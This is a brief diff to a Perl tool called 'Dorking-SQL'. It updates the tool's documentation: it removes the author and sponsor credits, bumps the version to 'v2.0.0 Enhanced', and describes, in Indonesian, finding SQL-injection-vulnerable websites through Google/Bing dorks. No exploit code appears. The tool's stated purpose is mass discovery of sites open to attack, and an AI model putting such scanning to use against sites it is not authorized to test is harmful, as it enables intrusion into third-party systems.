-    else{ print "$Lang{$lang}[21]\n" }
+    else{ print "$Lang{$lang}[23]\n" }
 }
 
 main();
@@ -607,16 +756,8 @@ Dorking-SQL
 
 =head1 Version
 
-Version v0.0.1 Beta
-
-=head1 Author
-
-Mr.GagalTotal666 dan GagalTotalNgentod666
-
-=head1 Sponsor Script
-
-Terima Kasih kepada : Crozz Cyborg , Exploit-DB.com , 0day-today .
+Version v2.0.0 Enhanced
 
 =head1 Description
 
-menemukan suatu pages vulnerable website dengan SQL Vulnerabilities menggunakan Dork
+Menemukan website vulnerable terhadap SQL Injection menggunakan Google/Bing dork dengan deteksi advanced
